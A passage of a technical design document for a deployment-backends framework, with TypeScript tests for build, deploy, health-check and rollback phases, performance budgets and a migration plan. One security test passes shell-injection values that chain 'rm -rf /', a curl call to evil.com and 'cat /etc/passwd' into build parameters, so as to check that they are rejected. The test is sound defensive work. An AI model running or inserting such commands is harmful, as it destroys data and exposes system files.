        repositoryPath: '/nonexistent/path'
      };
      
      await expect(backend.build(invalidContext)).rejects.toThrow();
    });

    it('respects build timeout if configured', async () => {
      const timeoutContext = {
        ...testContext,
        environmentConfig: {
          ...testContext.environmentConfig,
          timeouts: { build: 1 } // 1 second timeout
        }
      };
      
      // This test may pass if build is fast, but should not hang indefinitely
      const startTime = Date.now();
      try {
        await backend.build(timeoutContext);
        const elapsed = Date.now() - startTime;
        expect(elapsed).toBeLessThan(5000); // Should complete or fail within 5 seconds
      } catch (error) {
        const elapsed = Date.now() - startTime;
        expect(elapsed).toBeLessThan(5000);
        expect(error.message).toMatch(/timeout|time.*out/i);
      }
    });
  });

  describe('Deploy Phase', () => {
    let testArtifact: BuildArtifact;

    beforeEach(async () => {
      testArtifact = await backend.build(testContext);
    });

    it('produces valid DeploymentRecord with HMAC signature', async () => {
      const deployment = await backend.deploy(testArtifact, testEnvironment);
      
      expect(deployment.deploymentId).toBeTruthy();
      expect(deployment.requestId).toBe(testContext.requestId);
      expect(deployment.environment).toBe(testEnvironment.name);
      expect(deployment.artifactId).toBe(testArtifact.artifactId);
      expect(deployment.backend).toBe(backend.name);
      expect(deployment.deployedAt).toMatch(/^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}/);
      expect(deployment.signature).toMatch(/^hmac-sha256:[a-f0-9]{64}$/);
      expect(['deploying', 'healthy', 'degraded', 'failed']).toContain(deployment.status);
    });

    it('is idempotent - same artifact + env produces consistent result', async () => {
      const deployment1 = await backend.deploy(testArtifact, testEnvironment);
      const deployment2 = await backend.deploy(testArtifact, testEnvironment);
      
      // Should either be identical or second deployment should be a no-op
      expect(deployment1.artifactId).toBe(deployment2.artifactId);
      expect(deployment1.environment).toBe(deployment2.environment);
    });

    it('includes rollback data sufficient for rollback operation', async () => {
      const deployment = await backend.deploy(testArtifact, testEnvironment);
      
      expect(deployment.rollbackData).toBeDefined();
      expect(typeof deployment.rollbackData).toBe('object');
      
      // Verify rollback data contains necessary information
      if (backend.capabilities.supportsRollback) {
        expect(Object.keys(deployment.rollbackData).length).toBeGreaterThan(0);
      }
    });
  });

  describe('Health Check Phase', () => {
    let testDeployment: DeploymentRecord;

    beforeEach(async () => {
      const artifact = await backend.build(testContext);
      testDeployment = await backend.deploy(artifact, testEnvironment);
    });

    it('returns valid HealthStatus', async () => {
      const health = await backend.healthCheck(testDeployment);
      
      expect(typeof health.healthy).toBe('boolean');
      expect(health.checkType).toBeTruthy();
      expect(health.timestamp).toMatch(/^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}/);
      expect(health.details).toBeTruthy();
    });

    it('is read-only and idempotent', async () => {
      const health1 = await backend.healthCheck(testDeployment);
      const health2 = await backend.healthCheck(testDeployment);
      
      // Multiple health checks should not change deployment state
      expect(health1.healthy).toBe(health2.healthy);
      expect(health1.checkType).toBe(health2.checkType);
    });

    it('completes within reasonable time', async () => {
      const startTime = Date.now();
      await backend.healthCheck(testDeployment);
      const elapsed = Date.now() - startTime;
      
      expect(elapsed).toBeLessThan(60000); // Should complete within 1 minute
    });
  });

  describe('Rollback Phase', () => {
    let testDeployment: DeploymentRecord;

    beforeEach(async () => {
      const artifact = await backend.build(testContext);
      testDeployment = await backend.deploy(artifact, testEnvironment);
    });

    it('verifies HMAC signature before rollback', async () => {
      // Tamper with deployment record signature
      const tamperedDeployment = {
        ...testDeployment,
        signature: 'hmac-sha256:0000000000000000000000000000000000000000000000000000000000000000'
      };
      
      if (backend.capabilities.supportsRollback) {
        await expect(backend.rollback(tamperedDeployment)).rejects.toThrow(/signature/i);
      }
    });

    it('returns valid RollbackResult', async () => {
      if (!backend.capabilities.supportsRollback) {
        return; // Skip test for backends that don't support rollback
      }
      
      const result = await backend.rollback(testDeployment);
      
      expect(typeof result.success).toBe('boolean');
      expect(['healthy', 'failed', 'unknown']).toContain(result.newStatus);
      
      if (result.rollbackDurationMs !== undefined) {
        expect(typeof result.rollbackDurationMs).toBe('number');
        expect(result.rollbackDurationMs).toBeGreaterThanOrEqual(0);
      }
    });

    it('handles rollback of non-existent deployment gracefully', async () => {
      if (!backend.capabilities.supportsRollback) {
        return;
      }
      
      const fakeDeployment = {
        ...testDeployment,
        deploymentId: 'DEP-FAKE-DEPLOYMENT-12345',
        rollbackData: { nonexistent: 'deployment' }
      };
      
      // Re-sign the fake deployment
      const signer = new HMACDeploymentRecordSigner('test-key');
      const signedFakeDeployment = signer.signRecord(fakeDeployment);
      
      const result = await backend.rollback(signedFakeDeployment);
      
      // Should handle gracefully, not crash
      expect(typeof result.success).toBe('boolean');
      expect(result.error).toBeTruthy(); // Should have an error message
    });
  });

  describe('Security Tests', () => {
    it('prevents shell injection in parameters', async () => {
      const maliciousContext = {
        ...testContext,
        parameters: {
          project_id: 'test; rm -rf /',
          docker_image: 'test:latest; curl http://evil.com',
          command: 'echo "hello"; cat /etc/passwd'
        }
      };
      
      // Should either reject malicious input or sanitize it safely
      try {
        const artifact = await backend.build(maliciousContext);
        // If build succeeds, verify no actual shell injection occurred
        // This would require backend-specific verification
      } catch (error) {
        // Rejecting malicious input is acceptable
        expect(error.message).toMatch(/invalid|forbidden|security|validation/i);
      }
    });

    it('does not log sensitive configuration values', async () => {
      const sensitiveContext = {
        ...testContext,
        parameters: {
          database_password: 'secret123',
          api_token: 'token456',
          private_key: 'key789'
        }
      };
      
      // Capture logs during build
      const logs: string[] = [];
      const originalConsoleLog = console.log;
      console.log = (...args) => logs.push(args.join(' '));
      
      try {
        await backend.build(sensitiveContext);
        
        // Verify sensitive values don't appear in logs
        const logContent = logs.join('\n');
        expect(logContent).not.toContain('secret123');
        expect(logContent).not.toContain('token456');
        expect(logContent).not.toContain('key789');
        
      } finally {
        console.log = originalConsoleLog;
      }
    });
  });

  describe('Resource Management Tests', () => {
    it('cleans up resources on deployment failure', async () => {
      // Create a context that will cause deployment to fail
      const failingContext = {
        ...testContext,
        parameters: { invalid_configuration: true }
      };
      
      let deploymentAttempted = false;
      try {
        const artifact = await backend.build(testContext); // Build should succeed
        await backend.deploy(artifact, { 
          ...testEnvironment, 
          config: { 
            ...testEnvironment.config,
            settings: { invalid: 'configuration' }
          }
        });
        deploymentAttempted = true;
      } catch (error) {
        // Deployment should fail
        expect(deploymentAttempted || error).toBeTruthy();
        
        // If backend has cleanup method, it should be called
        if (backend.cleanup) {
          // This is a best-effort test - we can't easily verify cleanup
          // In a real implementation, this might check for leftover containers,
          // temp files, or other resources
        }
      }
    });
  });
});
```

### 15.2 Happy Path Integration Tests

```typescript
describe('Deployment Integration Tests', () => {
  describe('Full Deployment Lifecycle', () => {
    it('completes full build -> deploy -> health -> monitor cycle', async () => {
      const backend = new DockerLocalBackend();
      const context = createValidBuildContext();
      const environment = createValidEnvironment();
      
      // Build phase
      const artifact = await backend.build(context);
      expect(artifact.artifactId).toBeTruthy();
      
      // Deploy phase
      const deployment = await backend.deploy(artifact, environment);
      expect(deployment.status).toMatch(/deploying|healthy/);
      
      // Health check phase
      const health = await backend.healthCheck(deployment);
      expect(health.healthy).toBe(true);
      
      // Monitor phase (if supported)
      if (backend.monitor) {
        const monitor = await backend.monitor(deployment);
        expect(monitor.deploymentId).toBe(deployment.deploymentId);
        
        // Test log streaming
        let logCount = 0;
        for await (const logLine of monitor.getLogs()) {
          logCount++;
          if (logCount >= 5) break; // Get a few log lines then stop
        }
        expect(logCount).toBeGreaterThan(0);
        
        await monitor.close();
      }
    });
  });

  describe('Multi-Environment Deployment', () => {
    it('deploys to dev then staging with environment inheritance', async () => {
      const deploymentConfig = createMultiEnvironmentConfig();
      const resolver = new EnvironmentResolverImpl();
      
      // Deploy to dev environment
      const devEnv = resolver.resolveEnvironment('dev', deploymentConfig);
      expect(devEnv.backendType).toBe('docker-local');
      
      const devBackend = new DockerLocalBackend();
      const devArtifact = await devBackend.build(createBuildContext('dev'));
      const devDeployment = await devBackend.deploy(devArtifact, devEnv);
      
      // Deploy to staging environment (inherits from dev)
      const stagingEnv = resolver.resolveEnvironment('staging', deploymentConfig);
      expect(stagingEnv.backendType).toBe('static'); // Overridden
      expect(stagingEnv.config.cost_cap_usd).toBe(100); // Inherited and overridden
      
      const stagingBackend = new StaticBackend();
      const stagingArtifact = await stagingBackend.build(createBuildContext('staging'));
      const stagingDeployment = await stagingBackend.deploy(stagingArtifact, stagingEnv);
      
      expect(devDeployment.environment).toBe('dev');
      expect(stagingDeployment.environment).toBe('staging');
    });
  });
});
```

### 15.3 Failure Injection Tests

```typescript
describe('Deployment Failure Handling', () => {
  describe('Network Failures', () => {
    it('handles network timeouts gracefully', async () => {
      const backend = new StaticBackend();
      const context = createBuildContext();
      const environment = createEnvironmentWithUnreachableHost();
      
      const artifact = await backend.build(context);
      
      await expect(backend.deploy(artifact, environment))
        .rejects.toThrow(/timeout|network|unreachable/i);
    });
  });

  describe('Permission Failures', () => {
    it('handles insufficient permissions', async () => {
      const backend = new DockerLocalBackend();
      const context = createBuildContext();
      const environment = createEnvironmentWithRestrictedPermissions();
      
      await expect(backend.build(context))
        .rejects.toThrow(/permission|access|denied|forbidden/i);
    });
  });

  describe('Resource Limit Failures', () => {
    it('handles disk space exhaustion', async () => {
      const backend = new DockerLocalBackend();
      const context = createBuildContextWithLargeBuild();
      const environment = createEnvironment();
      
      // This test requires a way to simulate disk space limits
      // In practice, this might use a mock filesystem or container with limited disk
    });
  });

  describe('Rollback Failures', () => {
    it('escalates when rollback fails', async () => {
      const backend = new DockerLocalBackend();
      const deployment = createDeploymentRecordWithCorruptedRollbackData();
      
      const result = await backend.rollback(deployment);
      expect(result.success).toBe(false);
      expect(result.error).toBeTruthy();
    });
  });
});
```

## 16. Performance Requirements

### 16.1 Latency Budgets

| Backend Type | Build Time | Deploy Time | Health Check | Rollback Time |
|-------------|------------|-------------|--------------|---------------|
| `local` | < 5 seconds | < 30 seconds | < 1 second | < 10 seconds |
| `static` | < 2 minutes | < 1 minute | < 10 seconds | < 30 seconds |
| `docker-local` | < 5 minutes | < 1 minute | < 30 seconds | < 30 seconds |
| `github-pages` | < 3 minutes | < 2 minutes | < 30 seconds | < 1 minute |

### 16.2 Performance Monitoring

```typescript
interface PerformanceMetrics {
  deploymentId: string;
  backend: string;
  metrics: {
    buildDurationMs: number;
    deployDurationMs: number;
    healthCheckDurationMs: number;
    rollbackDurationMs?: number;
    totalDurationMs: number;
  };
  resourceUsage: {
    peakMemoryMB: number;
    diskUsageMB: number;
    networkTransferMB: number;
    cpuTimeMs: number;
  };
  timestamp: string;
}

class PerformanceTracker {
  private metrics: Map<string, PerformanceMetrics> = new Map();

  startDeployment(deploymentId: string, backend: string): void {
    this.metrics.set(deploymentId, {
      deploymentId,
      backend,
      metrics: {
        buildDurationMs: 0,
        deployDurationMs: 0,
        healthCheckDurationMs: 0,
        totalDurationMs: 0
      },
      resourceUsage: {
        peakMemoryMB: 0,
        diskUsageMB: 0,
        networkTransferMB: 0,
        cpuTimeMs: 0
      },
      timestamp: new Date().toISOString()
    });
  }

  recordPhaseDuration(deploymentId: string, phase: string, durationMs: number): void {
    const metric = this.metrics.get(deploymentId);
    if (metric) {
      (metric.metrics as any)[`${phase}DurationMs`] = durationMs;
    }
  }

  analyzePerformance(deploymentId: string): PerformanceAnalysis {
    const metric = this.metrics.get(deploymentId);
    if (!metric) {
      throw new Error(`No metrics found for deployment ${deploymentId}`);
    }

    const budgets = this.getPerformanceBudgets(metric.backend);
    const violations: string[] = [];

    if (metric.metrics.buildDurationMs > budgets.buildMs) {
      violations.push(`Build time ${metric.metrics.buildDurationMs}ms exceeds budget ${budgets.buildMs}ms`);
    }

    if (metric.metrics.deployDurationMs > budgets.deployMs) {
      violations.push(`Deploy time ${metric.metrics.deployDurationMs}ms exceeds budget ${budgets.deployMs}ms`);
    }

    return {
      withinBudgets: violations.length === 0,
      violations,
      percentiles: this.calculatePercentiles(metric.backend),
      recommendation: this.generatePerformanceRecommendation(metric)
    };
  }

  private getPerformanceBudgets(backend: string): PerformanceBudgets {
    const budgets = {
      'local': { buildMs: 5000, deployMs: 30000, healthMs: 1000, rollbackMs: 10000 },
      'static': { buildMs: 120000, deployMs: 60000, healthMs: 10000, rollbackMs: 30000 },
      'docker-local': { buildMs: 300000, deployMs: 60000, healthMs: 30000, rollbackMs: 30000 },
      'github-pages': { buildMs: 180000, deployMs: 120000, healthMs: 30000, rollbackMs: 60000 }
    };
    
    return budgets[backend] || budgets['static']; // Default to static budgets
  }
}
```

## 17. Migration & Rollout

### 17.1 Drop-in Replacement Strategy

The deployment framework is designed as a drop-in replacement for the existing stub deployment:

**Phase 1: Framework Introduction**
- Install bundled backends alongside existing stub
- Default all repositories to `local` backend (preserves exact current behavior)
- No configuration required - zero behavior change for existing repositories
- Framework handles backend selection gracefully falling back to `local`

**Phase 2: Opt-in Configuration**
- Repositories can create `.autonomous-dev/deploy.yaml` to enable new backends
- Existing repositories without configuration continue using `local` backend
- Gradual migration allows testing new backends on subset of repositories

**Phase 3: Backend Expansion**
- Cloud backend plugins become available as separate installs
- Operators choose which backends to install based on their infrastructure needs
- Framework automatically detects and registers installed backends

### 17.2 Backward Compatibility Guarantees

```typescript
interface BackwardCompatibilityValidator {
  validateLocalBackendBehavior(): Promise<ValidationResult>;
}

class BackwardCompatibilityValidatorImpl implements BackwardCompatibilityValidator {
  async validateLocalBackendBehavior(): Promise<ValidationResult> {
    const errors: string[] = [];
    
    // Test 1: Local backend preserves git workflow
    const localBackend = new LocalBackend();
    const testContext = this.createTestContext();
    const testEnv = this.createLocalTestEnvironment();
    
    const artifact = await localBackend.build(testContext);
    const deployment = await localBackend.deploy(artifact, testEnv);
    
    // Verify PR was created (existing behavior)
    if (!deployment.deployedEndpoint?.includes('pull/')) {
      errors.push('Local backend did not create pull request as expected');
    }
    
    // Test 2: Health check always succeeds (existing behavior)
    const health = await localBackend.healthCheck(deployment);
    if (!health.healthy) {
      errors.push('Local backend health check failed - should always succeed');
    }
    
    // Test 3: Rollback closes PR (existing rollback equivalent)
    const rollback = await localBackend.rollback(deployment);
    if (!rollback.success) {
      errors.push('Local backend rollback failed - should close PR');
    }
    
    return {
      valid: errors.length === 0,
      errors
    };
  }
}
```

### 17.3 Migration Guide

**For Repository Operators:**

1. **No Action Required**: Existing repositories continue working with no changes
2. **Enable Enhanced Deployment**: Create `.autonomous-dev/deploy.yaml` with desired backend
3. **Test Incrementally**: Start with dev environment, then staging, then production
4. **Gradual Rollout**: Enable new backends on low-risk repositories first

**Sample Migration Path:**

```yaml
# Week 1: Add docker-local for dev environment only
environments:
  dev:
    backend: "docker-local"
    settings:
      docker-local:
        ports: ["3000:3000"]

# Week 2: Add static backend for staging
  staging:
    inherits: "dev"
    backend: "static"
    settings:
      static:
        target_host: "staging.example.com"

# Week 3: Add github-pages for production docs
  prod:
    backend: "github-pages"
    settings:
      github-pages:
        custom_domain: "docs.example.com"
```

## 18. Open Questions

| # | Question | Owner | Priority |
|---|----------|-------|----------|
| Q1 | Should the framework support deployment of multiple artifacts to a single environment (e.g., microservices)? Current design assumes one artifact per deployment. | PM Lead | Medium |
| Q2 | How should the framework handle long-running builds (>10 minutes) in terms of daemon session management and progress reporting? | Tech Lead | High |
| Q3 | Should HMAC signing keys be per-repository or global? Per-repository provides better isolation but increases key management complexity. | Security Lead | High |
| Q4 | What level of Docker security should be enforced for docker-local backend? Current implementation assumes trusted local environment. | Security Lead | Medium |
| Q5 | Should backends support dry-run mode for deployment validation without actual resource creation? | PM Lead | Low |
| Q6 | How should the framework handle deployment dependencies between repositories (e.g., deploy service A before service B)? | Tech Lead | Low |
| Q7 | Should cost tracking include environmental impact metrics (e.g., carbon footprint) in addition to monetary cost? | PM Lead | Low |

## 19. References

- **PRD-014**: Deployment Backends Framework (parent requirements document)
- **PRD-007**: Escalation & Trust Framework (trust integration, approval gates)
- **PRD-001**: System Core & Daemon Engine (cost governance, ledger integration)
- **PRD-009**: Web Portal Security & Auth (HMAC key management cross-reference §22.3)
- **TDD-001**: Daemon Engine (deploy phase position in pipeline)
- **TDD-006**: Parallel Execution Engine (merge-back upstream of deployment)
- **TDD-024**: Cloud Backend Extensions (future cloud backends specification)